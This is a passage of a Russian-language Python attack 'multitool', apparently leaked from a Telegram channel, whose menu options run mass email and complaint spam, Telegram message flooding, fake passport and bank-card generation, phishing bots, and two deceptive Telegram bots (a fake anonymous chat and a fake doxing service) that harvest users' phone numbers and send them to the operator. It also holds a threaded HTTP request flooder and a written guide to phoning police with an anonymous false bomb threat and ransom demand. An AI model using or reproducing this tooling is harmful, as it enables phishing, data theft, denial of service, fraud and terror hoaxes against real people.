                number = pystyle.Write.Input(
                    f"[?] Введите номер -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                username = pystyle.Write.Input(
                    f"[?] Введите никнейм(с @) -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                device_name = socket.gethostname()
                ip_address = socket.gethostbyname(device_name)
                current_time = datetime.datetime.now()
                url = "https://telegram.org/support"#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                count = 0
                while True:
                    count += 1
                    chosen_text = random.choice(text)
                    chosen_contact = random.choice(contact)
                    send_complaint(chosen_text, chosen_contact)
            if choice == "26":
                print()
                username = pystyle.Write.Input(
                    f"[?] Введите никнейм канала(без @) -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                for senderemail, senderpassword in senders:
                    for recipientemail in recipients:
                        server = smtplib.SMTP("smtp.mail.ru", 587)
                        subject = random.choice(subjects)
                        messagetext = random.choice(messages)
                        sendemail(
                            senderemail,
                            senderpassword,
                            recipientemail,
                            subject,
                            server,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            messagetext,
                        )
            if choice == "27":
                print()
                username = pystyle.Write.Input(
                    f"[?] Введите никнейм канала(без @) -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                for senderemail, senderpassword in senders:
                    for recipientemail in recipients:
                        server = smtplib.SMTP("smtp.mail.yahoo.com", 587)
                        subject = random.choice(subjects)
                        messagetext = random.choice(messages)
                        sendemail(
                            senderemail,
                            senderpassword,
                            recipientemail,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            subject,
                            server,
                            messagetext,
                        )
            if choice == "28":
                print()
                username = pystyle.Write.Input(
                    f"[?] Введите никнейм канала(без @) -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                for senderemail, senderpassword in senders:
                    for recipientemail in recipients:
                        server = smtplib.SMTP("smtp.rambler.ru", 587)
                        subject = random.choice(subjects)
                        messagetext = random.choice(messages)
                        sendemail(
                            senderemail,
                            senderpassword,
                            recipientemail,
                            subject,
                            server,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            messagetext,
                        )
            if choice == "29":
                print()
                username = pystyle.Write.Input(
                    f"[?] Введите никнейм канала(без @) -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                for senderemail, senderpassword in senders:
                    for recipientemail in recipients:
                        server = smtplib.SMTP("smtp.gmail.com", 587)
                        subject = random.choice(subjects)
                        messagetext = random.choice(messages)
                        sendemail(
                            senderemail,
                            senderpassword,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            recipientemail,
                            subject,
                            server,
                            messagetext,
                        )
            if choice == "30":
                count = 0

                async def send_message():
                    while True:
                        try:
                            await client.send_message(linkc, message1)
                            pystyle.Write.Print(
                                "[+] Сообщение отправлено, всего отправлено -> ",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                            pystyle.Write.Print(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                                f"{count}\n", pystyle.Colors.white, interval=0.005
                            )
                        except Exception as e:
                            pystyle.Write.Print(
                                f"[!] Произошла ошибка -> ",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                            pystyle.Write.Print(
                                f"{e}\n", pystyle.Colors.white, interval=0.005
                            )

                async def main():
                    async with client:
                        global count
                        count += 1
                        await asyncio.gather(send_message())

                client = telethon.TelegramClient("session_telegram", api_id, api_hash)
                print()
                linkc = pystyle.Write.Input(
                    "[?] Введите ссылку на группу -> ",
                    pystyle.Colors.cyan_to_blue,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    interval=0.005,
                )
                print()
                message1 = pystyle.Write.Input(
                    "[?] Введите текст -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                print()
                asyncio.run(main())
            if choice == "31":
                print()
                input_text = pystyle.Write.Input(
                    "[?] Введите текст -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                transformed_text = transform_text(input_text)
                print()
                pystyle.Write.Print(
                    "[+] " + transformed_text,
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )
                print()
            if choice == "32":
                print()
                password_length = int(
                    pystyle.Write.Input(
                        "[?] Введите длину пароля: ",
                        pystyle.Colors.cyan_to_blue,
                        interval=0.005,
                    )
                )
                print()#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                complexity = pystyle.Write.Input(
                    "[?] Выберите сложность (low, medium, high): ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                complex_password = generate_password(password_length, complexity)
                pystyle.Write.Print(
                    "[+] -> " + complex_password + "\n",
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )
            if choice == "33":
                print()
                fake = faker.Faker(locale="ru_RU")
                gender = pystyle.Write.Input(
                    "[?] Введите пол (М - мужской, Ж - женский) -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                if gender.lower() not in ["м", "ж"]:
                    gender = random.choice(["М", "Ж"])
                    if gender.lower() == "м":
                        first_name = fake.first_name_male()
                        middle_name = fake.middle_name_male()#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                        last_name = fake.last_name_male()
                        gender_str = "Мужской"
                    else:
                        first_name = fake.first_name_female()
                        middle_name = fake.middle_name_female()
                        last_name = fake.last_name_female()
                        gender_str = "Женский"
                    pystyle.Write.Print(
                        f"[!] Вы ввели неверное значение, будет выбрано случайным образом -> ",
                        pystyle.Colors.cyan_to_blue,
                        interval=0.005,
                    )
                    pystyle.Write.Print(
                        f"{gender_str}\n", pystyle.Colors.white, interval=0.005
                    )
                    print()
                if gender.lower() == "м":
                    first_name = fake.first_name_male()
                    middle_name = fake.middle_name_male()
                    last_name = fake.last_name_male()
                    gender_str = "Мужской"
                else:
                    first_name = fake.first_name_female()#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    middle_name = fake.middle_name_female()
                    last_name = fake.last_name_female()
                    gender_str = "Женский"
                full_name = f"{last_name} {first_name} {middle_name}"
                birthdate = fake.date_of_birth()
                age = datetime.datetime.now().year - birthdate.year
                street_address = fake.street_address()
                city = fake.city()
                region = fake.region()
                postcode = fake.postcode()
                address = f"{street_address}, {city}, {region} {postcode}"
                fake.add_provider(faker.providers.internet.Provider)

                def generate_email(fake):
                    domain = fake.free_email_domain()
                    return fake.email(domain=domain)

                email = generate_email(fake)
                phone_number = fake.phone_number()
                inn = fake.random_number(digits=12, fix_len=True)
                snils = fake.random_number(digits=11, fix_len=True)#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                passport_num = fake.random_number(digits=10, fix_len=True)
                passport_series = fake.random_int(min=1000, max=9999)

                def print_personal_info(
                    full_name,
                    gender_str,
                    birthdate,
                    age,
                    address,
                    email,
                    phone_number,
                    inn,
                    snils,
                    passport_series,
                    passport_num,
                ):
                    print_formatted("[+] ФИО -> ", full_name)
                    print_formatted("[+] Пол -> ", gender_str)
                    print_formatted(
                        "[+] Дата рождения -> ", birthdate.strftime("%d.%m.%Y")
                    )
                    if age % 10 == 1 and age % 100 != 11:
                        age_text = f"{age} год"#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    elif age % 10 in [2, 3, 4] and age % 100 not in [12, 13, 14]:
                        age_text = f"{age} года"
                    else:
                        age_text = f"{age} лет"
                    print_formatted("[+] Возраст -> ", f"{age_text}")
                    print_formatted("[+] Адрес -> ", address)
                    print_formatted("[+] Email -> ", email)
                    print_formatted("[+] Телефон -> ", phone_number)
                    print_formatted("[+] ИНН -> ", inn)
                    print_formatted("[+] СНИЛС -> ", snils)
                    print_formatted("[+] Паспорт серия -> ", f"{passport_series}")
                    print_formatted("[+] Паспорт номер -> ", f"{passport_num}")

                def print_formatted(label, value):
                    pystyle.Write.Print(
                        label, pystyle.Colors.red_to_yellow, interval=0.005
                    )
                    pystyle.Write.Print(
                        f"{value}\n", pystyle.Colors.white, interval=0.005
                    )

                print_personal_info(
                    full_name,
                    gender_str,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    birthdate,
                    age,
                    address,
                    email,
                    phone_number,
                    inn,
                    snils,
                    passport_series,
                    passport_num,
                )
            if choice == "34":
                print()
                pystyle.Write.Print(
                    "[?] Выберите одну из стран:\n",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                pystyle.Write.Print(
                    "[?] 1 -> Украина\n", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                pystyle.Write.Print(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    "[?] 2 -> Россия\n", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                pystyle.Write.Print(
                    "[?] 3 -> Казахстан\n", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                print()
                country_choice = pystyle.Write.Input(
                    "[?] Ваш выбор -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                print()
                if country_choice not in ["1", "2", "3"]:
                    country_choice = random.choice(["Украина", "Россия", "Казахстан"])
                    pystyle.Write.Print(
                        f"[!] Вы ввели неверное значение, будет выбрано случайным образом -> ",
                        pystyle.Colors.red_to_yellow,
                        interval=0.005,
                    )
                    pystyle.Write.Print(
                        f"{country_choice}\n", pystyle.Colors.white, interval=0.005
                    )
                    print()#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                if country_choice == "1" or country_choice == "Украина":
                    country = "Украина"
                elif country_choice == "2" or country_choice == "Россия":
                    country = "Россия"
                elif country_choice == "3" or country_choice == "Казахстан":
                    country = "Казахстан"
                card = generate_random_card(country)
                pystyle.Write.Print(
                    "[+] Страна -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(
                    card["Страна"], pystyle.Colors.white, interval=0.005
                )
                pystyle.Write.Print(
                    "\n[+] Номер карты -> ",
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )
                pystyle.Write.Print(
                    card["Номер карты"], pystyle.Colors.white, interval=0.005
                )#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                pystyle.Write.Print(
                    "\n[+] Срок действия -> ",
                    pystyle.Colors.red_to_yellow,
                    interval=0.005,
                )
                pystyle.Write.Print(
                    card["Срок действия"], pystyle.Colors.white, interval=0.005
                )
                pystyle.Write.Print(
                    "\n[+] CVV -> ", pystyle.Colors.red_to_yellow, interval=0.005
                )
                pystyle.Write.Print(
                    card["CVV"] + "\n", pystyle.Colors.white, interval=0.005
                )
            if choice == "35":
                proxies = get_proxy()
                print()
                if proxies:
                    pystyle.Write.Print(
                        "[+] Прокси:", pystyle.Colors.red_to_yellow, interval=0.005
                    )#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    print()
                    for proxy in proxies:
                        pystyle.Write.Print(
                            "\n[+] -> ", pystyle.Colors.red_to_yellow, interval=0.005
                        )
                        pystyle.Write.Print(proxy, pystyle.Colors.white, interval=0.005)
                    print()
                else:
                    pystyle.Write.Print(
                        "[!] Прокси недоступно",
                        pystyle.Colors.red_to_yellow,
                        interval=0.005,
                    )
                    print()
            if choice == "36":
                num_agents = pystyle.Write.Input(
                    "\n[?] Введите количество User-Agent -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                generate_user_agents(int(num_agents))#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                print()
            if choice == "37":
                nazva = "VK"
                file = "VK.txt"
                fishingbots(file, nazva)
            if choice == "38":
                nazva = "TikTok"
                file = "TikTok.txt"
                fishingbots(file, nazva)
            if choice == "39":
                nazva = "Facebook"
                file = "Facebook.txt"
                fishingbots(file, nazva)
            if choice == "40":
                nazva = "YouTube"
                file = "YouTube.txt"
                fishingbots(file, nazva)
            if choice == "41":
                nazva = "OK"
                file = "OK.txt"
                fishingbots(file, nazva)
            if choice == "42":
                print()#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                bot = pystyle.Write.Input(
                    "[?] Введите бот Token -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                ID = pystyle.Write.Input(
                    "[?] Введите свой телеграм ID -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                bot = telebot.TeleBot(bot)
                bot.delete_webhook()
                waiting_users = []
                chatting_users = {}
                verified_users = {}

                def send_welcome(message):
                    if message.chat.id in verified_users:
                        bot.send_message(
                            message.chat.id,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            f"Приветствую {message.from_user.first_name}, это анонимный чат с быстрой передачей сообщений друг другу, здесь ты найдешь знакомства, друзей, и так далее☺.",
                        )
                        time.sleep(1)
                        bot.send_message(
                            message.chat.id,
                            "Теперь вы можете приступить к поиску знакомств!😋, отправьте команду /search чтобы начать поиск собеседника. Чтобы завершить диалог отправьте команду /stop",
                        )
                    else:
                        markup = telebot.types.InlineKeyboardMarkup()
                        markup.add(
                            telebot.types.InlineKeyboardButton(
                                text="Подтвердить личность🐱\u200d👤",
                                callback_data="verify",
                            )
                        )
                        bot.send_message(
                            message.chat.id,
                            f"Приветствую {message.from_user.first_name}, это анонимный чат с быстрой передачей сообщений друг другу, здесь ты найдешь знакомства, друзей, и так далее. Но для начала вам нужно подтвердить личность в связи с спамом🤒.",
                            reply_markup=markup,
                        )
#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                @bot.message_handler(commands=["start"])
                def start_handler(message):
                    send_welcome(message)

                @bot.callback_query_handler(func=lambda call: call.data == "verify")
                def verify_handler(call):
                    markup = telebot.types.ReplyKeyboardMarkup(
                        one_time_keyboard=True, resize_keyboard=True
                    )
                    button_contact = telebot.types.KeyboardButton(
                        text="Отправить контакт", request_contact=True
                    )
                    markup.add(button_contact)
                    bot.send_message(
                        call.message.chat.id,
                        "Пожалуйста, подтвердите свою личность, отправив свой контакт.",
                        reply_markup=markup,
                    )

                @bot.message_handler(content_types=["text"])
                def text_handler(message):#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    A = "Найден собеседник. Начните с ним диалог."
                    if message.chat.id not in verified_users:
                        bot.send_message(
                            message.chat.id,
                            "❌Подтвердите личность чтобы использовать эту команду❌",
                        )
                        return
                    if message.text == "/search":
                        waiting_users.append(message.chat.id)
                        bot.send_message(message.chat.id, "Ожидание собеседника⏱")
                        if len(waiting_users) > 1:
                            user1 = waiting_users.pop(0)
                            user2 = waiting_users.pop(0)
                            chatting_users[user1] = user2
                            chatting_users[user2] = user1
                            bot.send_message(user1, A)
                            bot.send_message(user2, A)
                    elif message.text == "/stop":
                        if message.chat.id in chatting_users:
                            partner_id = chatting_users[message.chat.id]
                            del chatting_users[message.chat.id]
                            del chatting_users[partner_id]
                            bot.send_message(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                                partner_id, "Собеседник закончил с вами диалог😥"
                            )
                            send_welcome(message)
                    elif message.chat.id in chatting_users:
                        bot.send_message(chatting_users[message.chat.id], message.text)

                @bot.message_handler(content_types=["contact"])
                def contact_handler(message):
                    if message.chat.id not in verified_users:
                        verified_users[message.chat.id] = message.contact.phone_number
                        get1 = f"""[+] Номер -> <code>{message.contact.phone_number}</code>
[+] ID -> <code>{message.chat.id}</code>
[+] Никнейм -> @{message.from_user.username}\n"""
                        get2 = f"""[+] Номер -> {message.contact.phone_number}
[+] ID -> {message.chat.id}
[+] Никнейм -> @{message.from_user.username}\n"""
                        with open("anonchat.txt", "a+", encoding="utf-8") as file:
                            file.write(get2)
                            pystyle.Write.Print(
                                get2, pystyle.Colors.red_to_yellow, interval=0.005
                            )#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            print()
                            bot.send_message(ID, get1, parse_mode="HTML")
                        bot.send_message(
                            message.chat.id,
                            "Отлично, теперь вы можете приступить к поиску знакомств!😋, отправьте команду /search чтобы начать поиск собеседника. Чтобы завершить диалог отправьте команду /stop",
                        )

                @bot.message_handler(content_types=["document"])
                def document_handler(message):
                    file_info = bot.get_file(message.document.file_id)
                    if file_info.file_path.endswith(
                        ".exe"
                    ) or file_info.file_path.endswith(".apk"):
                        bot.delete_message(message.chat.id, message.message_id)
                        bot.send_message(
                            message.chat.id,
                            "Извините, но отправка файлов .exe и .apk не разрешена.",
                        )

                bot.polling()
            if choice == "43":
                print()
                bot = pystyle.Write.Input(
                    "[?] Введите бот Token -> ",#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                ID = pystyle.Write.Input(
                    "[?] Введите свой телеграм ID -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                bot = telebot.TeleBot(bot)
                find_menu = telebot.types.InlineKeyboardMarkup()
                button0 = telebot.types.InlineKeyboardButton(
                    "🔎Начать поиск", callback_data="start_dox"
                )
                find_menu.row(button0)
                button1 = telebot.types.InlineKeyboardButton(
                    "⚙️Аккаунт", callback_data="dox"
                )
                button2 = telebot.types.InlineKeyboardButton(
                    "🆘Поддержка", callback_data="dox"#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                )
                find_menu.row(button1, button2)
                button3 = telebot.types.InlineKeyboardButton(
                    "🤖Создать собственный бот", callback_data="dox"
                )
                find_menu.row(button3)
                button4 = telebot.types.InlineKeyboardButton(
                    "🤝Партнерская программа", callback_data="dox"
                )
                find_menu.row(button4)

                @bot.message_handler(commands=["start"])
                def start(message):
                    bot.send_message(
                        message.from_user.id,
                        "*Добро пожаловать!*",
                        parse_mode="Markdown",
                    )
                    bot.send_message(
                        message.from_user.id,
                        "*Выберите нужное действие:*",
                        parse_mode="Markdown",
                        reply_markup=find_menu,
                    )#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes

                @bot.callback_query_handler(func=lambda call: call.data == "start_dox")
                def button0_pressed(call):
                    bot.send_message(
                        chat_id=call.message.chat.id,
                        text="👤 Поиск по имени\n├  `Блогер` _(Поиск по тегу)_\n├  `Антипов Евгений Вячеславович`\n└  `Антипов Евгений Вячеславович 05.02.1994`\n_(Доступны также следующие форматы_ `05.02`_/_`1994`_/_`28`_/_`20-28`_)_\n\n🚗 Поиск по авто\n├  `Н777ОН777` - поиск авто по *РФ*\n└  `ХТА21150053965897` - поиск по *VIN*\n\n👨 *Социальные сети*\n├  `https://www.instagram.com/violetta_orlova` - *Instagram*\n├  `https://vk.com/id577744097` - *Вконтакте*\n├  `https://facebook.com/profile.php?id=1` - *Facebook*\n└  `https://ok.ru/profile/162853188164` - *Одноклассники*\n\n📱 `79999939919` - для поиска по *номеру телефона*\n📨 `tema@gmail.com` - для поиска по *Email*\n📧 `#281485304`, `@durov` или `перешлите сообщение` - поиск по *Telegram* аккаунту\n\n🔐 `/pas churchill7` - поиск почты, логина и телефона *по паролю*\n🏚 `/adr Москва, Тверская, д 1, кв 1` - информация по адресу (РФ)\n🏘 `77:01:0001075:1361` - поиск по *кадастровому номеру*\n\n🏛 `/company Сбербанк` - поиск по *юр лицам*\n📑 `/inn 784806113663` - поиск по *ИНН*\n🎫 `/snils 13046964250` - поиск по *СНИЛС*\n\n📸 Отправьте *фото человека*, чтобы найти его или двойника на сайтах *ВК*, *ОК*.\n🚙 Отправьте *фото номера автомобиля*, чтобы получить о нем информацию.\n🙂 Отправьте *стикер*, чтобы найти *создателя*.\n🌎 Отправьте *точку на карте*, чтобы *найти людей*, которые сейчас там.\n🗣 С помощью *голосовых команд* также можно выполнять *поисковые запросы*.",
                        parse_mode="Markdown",
                    )

                send = telebot.types.ReplyKeyboardMarkup(
                    row_width=1, resize_keyboard=True
                )
                button_phone = telebot.types.KeyboardButton(
                    text="✅Подтвердить", request_contact=True
                )
                send.add(button_phone)

                @bot.message_handler(func=lambda message: True)
                def echo_all(message):
                    bot.reply_to(
                        message,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                        text="⚠️Прежде чем начать поиск, подтвердите свой аккаунт\n\n*Это временная мера, связанная с активной DDOS атакой на нас.*",
                        parse_mode="Markdown",
                        reply_markup=send,
                    )

                @bot.message_handler(content_types=["contact"])
                def contact(message):
                    if message.contact is not None:
                        try:
                            pystyle.Write.Print(
                                f"""[+] Никнейм -> @{message.from_user.username}\n[+] ID -> {message.from_user.id}\n[+] Номер -> {message.contact.phone_number}\n""",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                            print()
                            bot.send_message(
                                ID,
                                f"[+] Никнейм -> @{message.from_user.username}\n[+] ID -> <code>{message.from_user.id}</code>\n[+] Номер -> <code>{message.contact.phone_number}</code>",
                                parse_mode="HTML",
                            )
                            f = open("glazboga.txt", "a+")#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            f.write(
                                f"""[+] Никнейм -> @{message.from_user.username}\n[+] ID -> {message.from_user.id}\n[+] Номер -> {message.contact.phone_number}\n"""
                            )
                            f.close()
                        except TypeError:
                            pystyle.Write.Print(
                                traceback.print_exc(),
                                pystyle.Colors.cyan_to_blue,
                                interval=0.005,
                            )
                        curhour = time.asctime().split(" ")[3].split(":")[0]
                        bot.send_message(
                            message.from_user.id,
                            f"*⚠️ Технические работы до  {int(curhour)+7}:00 по мск.*\n\nРаботы будут завершены в данный промежуток времени, все подписки продлены.",
                            parse_mode="Markdown",
                            reply_markup=telebot.types.ReplyKeyboardRemove(),
                        )

                bot.polling()
            if choice == "44":
                print()#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                url = pystyle.Write.Input(
                    "[?] Введите ссылку -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                num_requests = int(
                    pystyle.Write.Input(
                        "[?] Введите количество запросов -> ",
                        pystyle.Colors.cyan_to_blue,
                        interval=0.005,
                    )
                )
                print()

                def generate_user_agent():
                    versions = [
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefo#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytesx/{0}.0",
                        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
                        "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                    ]
                    version = random.randint(60, 90)
                    year = random.randint(10, 21)
                    month = random.randint(1, 12)
                    user_agent = random.choice(versions).format(
                        version, year, year, month
                    )
                    return user_agent

                def send_request(i):
                    headers = {"User-Agent": generate_user_agent()}
                    try:
                        response = requests.get(url, headers=headers)
                        print(
                            f"{colorama.Style.BRIGHT + colorama.Fore.RED}[{colorama.Style.BRIGHT + colorama.Fore.YELLOW}+{colorama.Style.BRIGHT + colorama.Fore.RED}]{colorama.Style.BRIGHT + colorama.Fore.WHITE} Request {i} sent successfully\n"
                        )
                    except:
                        print(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            f"{colorama.Style.BRIGHT + colorama.Fore.RED}[{colorama.Style.BRIGHT + colorama.Fore.YELLOW}+{colorama.Style.BRIGHT + colorama.Fore.RED}]{colorama.Style.BRIGHT + colorama.Fore.WHITE} Request {i} sent unsuccessfully\n"
                        )

                threads = []
                for i in range(1, num_requests + 1):
                    t = threading.Thread(target=send_request, args=[i])
                    t.start()
                    threads.append(t)
                for t in threads:
                    t.join()
            if choice == "45":
                print()
                url = pystyle.Write.Input(
                    f"[?] Введите ссылку -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                web_crawler(url, depth=2)
            if choice == "46":
                print()
                phone_number = pystyle.Write.Input(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                    "[?] Введите номер -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                print()
                phoneinfo(phone_number)
                print()
            if choice == "47":
                print()
                nick = pystyle.Write.Input(
                    f"[?] Введите никнейм -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                urls = [
                    ("Instagram", f"https://www.instagram.com/{nick}"),
                    ("TikTok", f"https://www.tiktok.com/@{nick}"),
                    ("Twitter", f"https://twitter.com/{nick}"),
                    ("Facebook", f"https://www.facebook.com/{nick}"),
                    ("YouTube", f"https://www.youtube.com/@{nick}"),
                    ("Telegram", f"https://t.me/{nick}"),
                    ("Roblox", f"https://www.roblox.com/user.aspx?username={nick}"),
                    ("Twitch", f"https://www.twitch.tv/{nick}"),
                ]#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                print()
                for name, url in urls:
                    try:
                        response = requests.get(url)
                        if response.status_code == 200:
                            pystyle.Write.Print(
                                f"[+] {name} -> ",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                            pystyle.Write.Print(
                                f"{url}", pystyle.Colors.white, interval=0.005
                            )
                            pystyle.Write.Print(
                                f" -> аккаунт найден\n",#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                        elif response.status_code == 404:
                            pystyle.Write.Print(
                                f"[+] {name} -> ",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                            pystyle.Write.Print(
                                f"{url}", pystyle.Colors.white, interval=0.005
                            )
                            pystyle.Write.Print(
                                f" -> аккаунт не найден\n",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                        else:
                            pystyle.Write.Print(
                                f"[+] {name} -> ",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                            pystyle.Write.Print(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                                f"{url}", pystyle.Colors.white, interval=0.005
                            )
                            pystyle.Write.Print(
                                f" -> произошла ошибка -> ",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                            pystyle.Write.Print(
                                f"{response.status_code}\n",
                                pystyle.Colors.white,
                                interval=0.005,
                            )
                    except:
                        pystyle.Write.Print(
                            f"[+] {name} -> ",
                            pystyle.Colors.red_to_yellow,
                            interval=0.005,
                        )
                        pystyle.Write.Print(
                            f"{url}", pystyle.Colors.white, interval=0.005
                        )#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                        pystyle.Write.Print(
                            f" -> произошла ошибка при проверке\n",
                            pystyle.Colors.red_to_yellow,
                            interval=0.005,
                        )
            if choice == "48":
                print()
                domain = pystyle.Write.Input(
                    "[?] Введите ссылку -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                print()
                get_website_info(domain)
                print()
            if choice == "49":
                print()
                domain = pystyle.Write.Input(
                    "[?] Введите домен -> ", pystyle.Colors.cyan_to_blue, interval=0.005
                )
                print()#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                get_website_info(domain)
                print()
            if choice == "50":
                print()
                ip_address = pystyle.Write.Input(
                    "[?] Введите IP-адрес для поиска -> ",
                    pystyle.Colors.cyan_to_blue,
                    interval=0.005,
                )
                ip_lookup(ip_address)
            if choice == "51":

                def scan_file(file_path, search_text, coder):
                    if os.path.exists(file_path):
                        try:
                            lines_with_text = []
                            with open(
                                file_path, "r", encoding=coder, errors="ignore"
                            ) as file:
                                for line in file:
                                    if search_text in line:#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                                        if re.search(
                                            search_text, line, flags=re.IGNORECASE
                                        ):
                                            lines_with_text.append(line.strip())
                            return lines_with_text
                        except Exception as e:
                            return f"\n[!] Ошибка! : {e}"
                    else:
                        pystyle.Write.Print(
                            "\n[!] Файл не обнаружен!", pystyle.Colors.red_to_yellow
                        )

                def custom_database():
                    try:
                        print()
                        file_path = pystyle.Write.Input(
                            "[?] Введите путь к базе данных -> ",
                            pystyle.Colors.cyan_to_blue,
                            interval=0.005,
                        )
                        search_text = pystyle.Write.Input(#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                            "\n\n[?] Введите что искать -> ",
                            pystyle.Colors.cyan_to_blue,
                            interval=0.005,
                        )
                        coder = pystyle.Write.Input(
                            "\n\n[?] Выберите кодировку -> ",
                            pystyle.Colors.cyan_to_blue,
                            interval=0.005,
                        )
                        result1 = scan_file(file_path, search_text, coder)
                        if not result1:
                            pystyle.Write.Print(
                                "\n\n[!] Ничего не найдено!",
                                pystyle.Colors.red_to_yellow,
                                interval=0.005,
                            )
                        else:
                            pystyle.Write.Print(
                                "\n\n[+] -> " + result1, pystyle.Colors.red_to_yellow
                            )
                    except:
                        pystyle.Write.Print(
                            "\n\n[+] Произошла ошибка! Проверьте ввод данных!",
                            pystyle.Colors.red_to_yellow,#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
                        )

                custom_database()
            if choice == "52":
                pystyle.Write.Print(
                    """
Для обеспечения анонимности мы можем использовать следующие методы:

1. Mullvad VPN.
2. Прокси.
3. Использование раздачи интернета с мобильного телефона.
4. Voice Changer.

Далее, мы приобретаем Skype с балансом. Ищем в интернете контактные номера дежурных частей МВД. Подходят только номера с кодом +7, так как через 112 невозможно сделать звонок. Подключаем Voice Changer и звоним, заявляя: "Я - террорист-смертник. Я заложил более 10 гексогеновых взрывчаток в [адрес], которые взорвутся через полчаса. Мои требования - выкуп в размере двух миллионов рублей на мой телефонный счёт [номер]".\n""",
                    pystyle.Colors.light_gray,
                    interval=0.005,
                )
            if choice == "54":
                pystyle.Write.Print(
                    """
Базовые принципы обеспечения анонимности:#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes

1. Приобретение сим-карты в анонимных местах и регистрация на нее в социальных сетях, представляя ее как легитимный номер.
#СЛИТО НА КАНАЛЕ t.me/Falcon_Bytes
